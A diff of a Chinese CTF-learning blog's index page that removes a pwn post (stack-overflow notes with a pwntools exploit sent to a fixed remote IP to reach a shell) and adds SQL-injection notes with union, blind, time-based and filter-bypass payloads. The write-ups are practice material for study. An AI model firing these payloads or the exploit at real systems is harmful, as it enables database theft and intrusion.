@@ -245,12 +245,12 @@
   
   
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/pwn/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hhd">
@@ -269,7 +269,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/09/20/pwn/" itemprop="url">pwn学习</a></h1>
+                <a class="post-title-link" href="/2017/09/20/sql-3/" itemprop="url">好玩的sql第三篇</a></h1>
         
 
         <div class="post-meta">
@@ -304,8 +304,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
+                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
+                    <span itemprop="name">sql.fun</span>
                   </a>
                 </span>
 
@@ -343,38 +343,9 @@
       
         
           
-            <h2 id="C与C-安全编码"><a href="#C与C-安全编码" class="headerlink" title="C与C++安全编码"></a>C与C++安全编码</h2><blockquote>
-<p>有关字符串的一些概念</p>
-</blockquote>
-<p><strong>字符串</strong><br>c语言中都是以数组存储字符串，以\0作为字符串结尾，低位地址是数组首元素地址，高位地址是数组末元素地址。<br><em>sizeof</em>  用来计算数组大小。但是对于数组与指针应用时，sizeof对同一个数组的大小计算不同。果然我们学的是基础的c语言，如果当时学仔细一点，就应该发现这个问题的。</p>
-<p><strong>宽字节</strong>简单来说就是大一点的字符，需要更多空间。</p>
-<p><strong>字符串字面值</strong>就是这个字符串的值，宽字符串前缀是L</p>
-<p><strong>字符串类型</strong>：C语言中字符串常量类型为int<br>以下结果是4,1.告诉我们C语言中神奇的存储，我以前都没怎么注意说实话…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;string.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#define  x &apos;a&apos;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char a[1];</div><div class="line">	printf(&quot;%ld\n&quot;,sizeof(x));</div><div class="line">	printf(&quot;%ld\n&quot;,sizeof(a));</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p><strong>计算字符串大小</strong><br>strlen函数是我们经常用来计算字符串元素个数的，但是如果应用于宽字节，就会导致错误。strlen函数一旦遇到空字节就判断字符串结束，但是宽字符包含空字节。所以会产生错误。</p>
-<blockquote>
-<p>字符串的常见错误</p>
-</blockquote>
-<p>最常见的字符串错误：无界字符串复制错误，差一错误，空结尾错误，字符串截断错误。</p>
-<p>一、无界字符串复制<br>例如gets就是一个很麻烦的例子。<br>当定义数组小于输入字符串时，就会发生错误。<br>同样的，命令行参数输入，如果复制进定义的数组，但是定义数组空间不够的话，就会发生错误。</p>
-<p>二、差一错误<br>与数组越界类似，预定数组长度不够的情况下会发生。</p>
-<p>三、空字符结尾错误<br>指的是字符串数组没有以正确的空字符结尾。<br>比如，strncpy复制不超过n个字符，很可能为复制进空字符结尾，这样会导致数组很大很大，超过想象，那么对另一个数组进行操作时，就会发生错误。有时候编译器不会告诉你错误，但是漏洞就会存在。</p>
-<p>四、字符串截断<br>数组长度不足以容纳一个字符串的内容时，会发生字符串截取，程序员为了防止缓冲区溢出，可能会用到字符串截取，有可能会导致丢失数据或者出现漏洞。</p>
-<p>五、与函数无关的字符串错误<br>这个我感觉发生的概率比前几个高。<br>简略版代码：（略略略）buff[128] buff[i]=a[i] buff[i]=’\0’</p>
-<blockquote>
-<p>字符串漏洞及其利用</p>
-</blockquote>
-<p><strong>一、缓冲区溢出</strong><br>名字虽然很高深的样子，其实就是数组或者特定分配的内存空间外写进数据，就称为缓冲区溢出。未进行隐式的边界检查。</p>
-<p><strong>二、栈管理及栈溢出</strong><br><em>基本概念</em>：从C语言来说就是 <em>先进后出</em> 的某个对内存的操作后的内存（= =）<br>一般来说，弹 <em>出栈</em> 意味着栈指针需要 <em>递增</em> 。栈在压入变量之后一般还会在最后压入返回地址，这意味着一旦这一段结束即可返回。（可能是错的，只是暂时的总结）<br><em>栈溢出</em>：由于栈在内存中按顺序存储，一个栈可能存储许多不同类型的数据，包括变量，指针，地址等等。如果用户恶意输入，很可能使得数据泄露或者越过某些数据检验。比如，简单的弧注入攻击。<br><em>代码注入</em>：被恶意注入的代码也叫外壳代码，攻击者往往利用某个子例程的返回地址导致栈混乱，从而获取该程序相同的权限，如果是root权限，即是开一个远程shell，获取最高权限。<br>恶意参数的特征：（感觉很有趣）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">有漏洞的程序必须接受它作为合法的输入</div><div class="line">参数，以及其他可控制的输入，必须导致有漏洞的代码路径得到执行</div><div class="line">参数不能在程序将控制权转移到shellcode之前导致程序异常中止</div></pre></td></tr></table></figure>
-<h2 id="个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。"><a href="#个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。" class="headerlink" title="个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。"></a>个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。</h2><blockquote>
-<p>题目</p>
-</blockquote>
-<p>给出了a.out<br>第一步，反汇编。核心代码如下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">一、</div><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  _x86_get_pc_thunk_ax();</div><div class="line">  vul();</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">二、</div><div class="line">void vul()</div><div class="line">&#123;</div><div class="line">  char a[100]; // [sp+Ch] [bp-6Ch]@1</div><div class="line"></div><div class="line">  puts(&quot;--------------------------------------------------------------------------&quot;);</div><div class="line">  printf(</div><div class="line">    &quot;杩欎釜绋嬪簭閲岄潰鏈変釜鍙埍鐨勫皬濮愬锛屽ス鍦08p,浣嗘槸涓囨伓鐨勭帇灏忓悰涓嶄細璋冪敤濂癸紝鐣ョ暐鐣ワ紒\n&quot;,</div><div class="line">    xiaoxiannv);</div><div class="line">  fflush(0);</div><div class="line">  puts(&quot;     缁欎綘涓満浼氾紝璁╀綘璇村彞璇濓紝瑕佹槸浣犺兘鎰熷姩灏忓悰锛岄偅涔堝氨璁╀綘鍜屽皬濮愬瀵硅瘽锛);</div><div class="line">  puts(&quot;--------------------------------------------------------------------------&quot;);</div><div class="line">  fflush(0);</div><div class="line">  read(0, a, 0x3E8u);</div><div class="line">  puts(&quot;emmmmm锛屼笉鏁㈠姩锛屼竴鐐归兘涓嶆暍鍔紒&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">三、</div><div class="line">void xiaoxiannv()</div><div class="line">&#123;</div><div class="line">  int v0; // eax@1</div><div class="line"></div><div class="line">  v0 = _x86_get_pc_thunk_ax();</div><div class="line">  system(&amp;aBinSh[v0 - 134513874]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>main函数中跳转到vul函数，重点关注read(0, a, 0x3E8u)这句话，这个是把a的大小放入内存，这样就容易造成栈溢出。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"></div><div class="line">from pwn import *</div><div class="line">payload = &apos;a&apos;*112+p32(0x80484c6)</div><div class="line">p = remote(&apos;121.42.189.18&apos;,5009)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div><div class="line">print p.recvall()</div></pre></td></tr></table></figure>
-<p>由char a[100]; // [sp+Ch] [bp-6Ch]@1可知，a的实际内存大小为108再加上ebp的大小一共为112。再跳到xiaoxiannv那个函数。<br>再就是关于linux命令的知识了。</p>
-<hr>
+            <p>第三篇与一二篇又有点类似，不过php写的形式有点不同，有些程序员花样就是多…</p>
+<p>同样输入?id=1’<br>以下是三次的对比错误返回：<br>1.Erreur de syntaxe près de ‘’1’’ LIMIT 0,1’ à la ligne 1<br>2.Erreur de syntaxe près de ‘’ LIMIT 0,1’ à la ligne 1<br>3.Erreur de syntaxe près de ‘’1’’) LIMIT 0,1’ à la ligne 1</p>
+<p>?id=1’) union select 1,2,3–+<br>与一二篇类似。</p>
 
           
         
@@ -1310,7 +1281,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/07/sql注入总结/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/07/sql注入小技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hhd">
@@ -1329,7 +1300,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/09/07/sql注入总结/" itemprop="url">sql注入总结</a></h1>
+                <a class="post-title-link" href="/2017/09/07/sql注入小技巧/" itemprop="url">sql注入小技巧</a></h1>
         
 
         <div class="post-meta">
@@ -1403,202 +1374,7 @@
       
         
           
-            <p>重新来写这个总结。<br>发现以前写的太机械，其实在做题过程中，很多种情况有不同的方法。<br>我之前写的感觉不像ctf方向，这次就从 <strong><em>ctf方向</em></strong> 写起。</p>
-<hr>
-<blockquote>
-<p><strong><em>一些心得</em></strong>（无前后顺序）</p>
-</blockquote>
-<p>1.看<strong>页面代码</strong>，一般里面会有一些特殊的信息。</p>
-<p>2.判断是否直接打印出<strong>query结果</strong>，这很重要，在我看来，如果直接打印就比较方便，可以很快得出你想要的结果。但是如果不是，可能需要通过盲注等方法获取</p>
-<p>3.一些存着的语句，其实每次sql打字都很费时啊，要是直接可以复制粘贴岂不是美滋滋。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">判断字段数：?id=0&apos; union select * from 表名 order by 数字 #</div><div class="line"></div><div class="line">判断字段数：?id=0&apos; union select 1,2,3--+</div><div class="line"></div><div class="line">得出数据库等信息：?id=0&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</div><div class="line"></div><div class="line">判断数据库版本：?id=1&apos; and left(select version(),1)=4--+</div><div class="line"></div><div class="line">判断数</div><div class="line">据库名：?id=1&apos; and left(database(),1)=&apos;u&apos;--+</div><div class="line"></div><div class="line">判断表名：?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1)))=数字（这些盲注很多可以利用burpsuite）</div><div class="line"></div><div class="line">判断库名：?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(5))</div><div class="line">利用时间盲注</div></pre></td></tr></table></figure>
-<p>其实以上语句只是为了给我方便，但很多时候他都需要有一些灵活的改变，比如id那里可能本身他就是整数类型，也可能这个程序他过滤了引号等等等等。所以还是需要根本情况而定，耐心很重要。</p>
-<p>4.一些注意点，关于url及其他语言的小知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">若空格被过滤，可以用%a0或者/**/代替，注释--+也可以用%23代替</div><div class="line">我们通常需要在尾部加注释，平常的注释用的是#或者是-- 但是在url里面使用--+</div></pre></td></tr></table></figure></p>
-<hr>
-<blockquote>
-<p><strong><em>一些书本知识</em></strong></p>
-</blockquote>
-<p>一.识别数据库<br>识别DBMS是很重要的，因为不同的系统注入还是有差别的。<br>asp和.net一般用sql server 做后台数据库；php很可能是mysql；应用如果是java写的，一般是oracle或者mysql；安装IIS的很可能是sql server；运行apache和php的linux服务器很可能是开源的mysql。<br>如果DBMS处于非盲态，那通过错误反馈一般可以知道DBMS的类型，但是如果处于盲态，必须通过一些查询注入才能得知。<br>1.非盲态跟踪<br>加引号，sqlserver和mysql都会在错误反馈中直接显示，oracle则会显示ORA，因为oracle有一个oracle错误消息库<br>关于sql server的几个内置变量：<br>@@version 数据库版本  @@servername 安装sql server的服务器名称   @@language 当前所使用语言的名称   @@spid 当前用户的进程ID（记住这个我也不懂怎么注入sql server呀！）<br>2.盲跟踪<br>一些简单的语法知识就不讲了<br>详细讲一下union查询<br>用union查询最重要的一点就是必须要两条语句列数相同，从本篇最上面的猜解字段我们可以判断列数,easy~接着就是类型相同，大多是字符串类型，所以一般不需要太注意<br>三种DBMS都可使用order by,也可以使用select 1,2,3…不过前者速度更快，而且在数据库日志中留下的痕迹少…<br>哦，对了，%2B是加好的意思，因为加号在html里面会被注释<br>有些时候你必须保证这个数据是字符串类型，需要用到强制转换，虽然我觉得不怎么用到，反正我做了一点点注入是没遇到过，但是还是记录下。<br>sql server:select cast(‘123’,varchar)<br>mysql:select cast(‘123’,char)<br>oracle:select cast(1,varchar) from dual<br>还有一个注意点，就是如果是返回几行数据的，你需要注意,union前面的条件需要为假才能使你这个查询有效。</p>
-<hr>
-<blockquote>
-<p><strong><em>基于时间的盲注</em></strong></p>
-</blockquote>
-<p><em>基本套路</em>：if(条件，ture怎么办，false怎么办)<br>sleep()：从时间长度判断是否正确，一般加在false里面<br>无法基于布尔盲注的情况下采用时间盲注</p>
-<hr>
-<blockquote>
-<p><strong><em>burpsuite下的sql注入</em></strong></p>
-</blockquote>
-<p>burpsuite中的intruder：手工帮你爆破，在猜解数据库名，表名，字段数时尤为有用，不过便捷程度小于sqlmap</p>
-<hr>
-<p>还有一些要补充的，比如绕过之类的，晚上回来重点学文件包含和sql注入绕过以及sqlmap的使用。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/07/盲注小解/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="hhd">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hhd">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/07/盲注小解/" itemprop="url">盲注小解</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-07T19:04:30+08:00">
-                2017-09-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql注入/" itemprop="url" rel="index">
-                    <span itemprop="name">sql注入</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>一.基于布尔的SQL注入</p>
-</blockquote>
-<ol>
-<li><p>left(database(),1) 截取该数据库前1位。</p>
-</li>
-<li><p>ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))  substr表示从第几位截取多少长度</p>
-</li>
-<li><p>ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))   mid表示从第几位截取到第几位 ord=ascii</p>
-</li>
-<li><p>正则暂时不介绍。</p>
-</li>
-<li><p>select user() like ‘ro%’   like表示模糊匹配</p>
-</li>
-</ol>
-<blockquote>
-<p>基于时间的SQL盲注</p>
-</blockquote>
-<ol>
-<li><p>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5)) 如果错误延时五秒。</p>
-</li>
-<li><p>BENCHMARK(100000,MD5(1))可以代替sleep(5)，不过需要占用很多的cpu资源。</p>
-</li>
-</ol>
-<blockquote>
-<p>基于报错的SQL注入（暂时不讲）</p>
-</blockquote>
+            <p>1.group by pwd with rollup limit 1 offset 2 #<br>2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #<br>3.绕过引号：利用十六进制，如”user”=0x750x730x650x72<br>4.大于小于绕过：greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值，如：greatest(ascii(substr(database(),0,1)),64)=64</p>
 
           
         
@@ -1776,6 +1552,175 @@
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/07/sql注入总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hhd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hhd">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/07/sql注入总结/" itemprop="url">sql注入总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-07T19:04:30+08:00">
+                2017-09-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql注入/" itemprop="url" rel="index">
+                    <span itemprop="name">sql注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>重新来写这个总结。<br>发现以前写的太机械，其实在做题过程中，很多种情况有不同的方法。<br>我之前写的感觉不像ctf方向，这次就从 <strong><em>ctf方向</em></strong> 写起。</p>
+<hr>
+<blockquote>
+<p><strong><em>一些心得</em></strong>（无前后顺序）</p>
+</blockquote>
+<p>1.看<strong>页面代码</strong>，一般里面会有一些特殊的信息。</p>
+<p>2.判断是否直接打印出<strong>query结果</strong>，这很重要，在我看来，如果直接打印就比较方便，可以很快得出你想要的结果。但是如果不是，可能需要通过盲注等方法获取</p>
+<p>3.一些存着的语句，其实每次sql打字都很费时啊，要是直接可以复制粘贴岂不是美滋滋。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">判断字段数：?id=0&apos; union select * from 表名 order by 数字 #</div><div class="line"></div><div class="line">判断字段数：?id=0&apos; union select 1,2,3--+</div><div class="line"></div><div class="line">得出数据库等信息：?id=0&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</div><div class="line"></div><div class="line">判断数据库版本：?id=1&apos; and left(select version(),1)=4--+</div><div class="line"></div><div class="line">判断数</div><div class="line">据库名：?id=1&apos; and left(database(),1)=&apos;u&apos;--+</div><div class="line"></div><div class="line">判断表名：?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1)))=数字（这些盲注很多可以利用burpsuite）</div><div class="line"></div><div class="line">判断库名：?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(5))</div><div class="line">利用时间盲注</div></pre></td></tr></table></figure>
+<p>其实以上语句只是为了给我方便，但很多时候他都需要有一些灵活的改变，比如id那里可能本身他就是整数类型，也可能这个程序他过滤了引号等等等等。所以还是需要根本情况而定，耐心很重要。</p>
+<p>4.一些注意点，关于url及其他语言的小知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">若空格被过滤，可以用%a0或者/**/代替，注释--+也可以用%23代替</div><div class="line">我们通常需要在尾部加注释，平常的注释用的是#或者是-- 但是在url里面使用--+</div></pre></td></tr></table></figure></p>
+<hr>
+<blockquote>
+<p><strong><em>一些书本知识</em></strong></p>
+</blockquote>
+<p>一.识别数据库<br>识别DBMS是很重要的，因为不同的系统注入还是有差别的。<br>asp和.net一般用sql server 做后台数据库；php很可能是mysql；应用如果是java写的，一般是oracle或者mysql；安装IIS的很可能是sql server；运行apache和php的linux服务器很可能是开源的mysql。<br>如果DBMS处于非盲态，那通过错误反馈一般可以知道DBMS的类型，但是如果处于盲态，必须通过一些查询注入才能得知。<br>1.非盲态跟踪<br>加引号，sqlserver和mysql都会在错误反馈中直接显示，oracle则会显示ORA，因为oracle有一个oracle错误消息库<br>关于sql server的几个内置变量：<br>@@version 数据库版本  @@servername 安装sql server的服务器名称   @@language 当前所使用语言的名称   @@spid 当前用户的进程ID（记住这个我也不懂怎么注入sql server呀！）<br>2.盲跟踪<br>一些简单的语法知识就不讲了<br>详细讲一下union查询<br>用union查询最重要的一点就是必须要两条语句列数相同，从本篇最上面的猜解字段我们可以判断列数,easy~接着就是类型相同，大多是字符串类型，所以一般不需要太注意<br>三种DBMS都可使用order by,也可以使用select 1,2,3…不过前者速度更快，而且在数据库日志中留下的痕迹少…<br>哦，对了，%2B是加好的意思，因为加号在html里面会被注释<br>有些时候你必须保证这个数据是字符串类型，需要用到强制转换，虽然我觉得不怎么用到，反正我做了一点点注入是没遇到过，但是还是记录下。<br>sql server:select cast(‘123’,varchar)<br>mysql:select cast(‘123’,char)<br>oracle:select cast(1,varchar) from dual<br>还有一个注意点，就是如果是返回几行数据的，你需要注意,union前面的条件需要为假才能使你这个查询有效。</p>
+<hr>
+<blockquote>
+<p><strong><em>基于时间的盲注</em></strong></p>
+</blockquote>
+<p><em>基本套路</em>：if(条件，ture怎么办，false怎么办)<br>sleep()：从时间长度判断是否正确，一般加在false里面<br>无法基于布尔盲注的情况下采用时间盲注</p>
+<hr>
+<blockquote>
+<p><strong><em>burpsuite下的sql注入</em></strong></p>
+</blockquote>
+<p>burpsuite中的intruder：手工帮你爆破，在猜解数据库名，表名，字段数时尤为有用，不过便捷程度小于sqlmap</p>
+<hr>
+<p>还有一些要补充的，比如绕过之类的，晚上回来重点学文件包含和sql注入绕过以及sqlmap的使用。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
@@ -1839,7 +1784,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-count">11</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1850,7 +1795,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/tags.html">
-                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-count">11</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
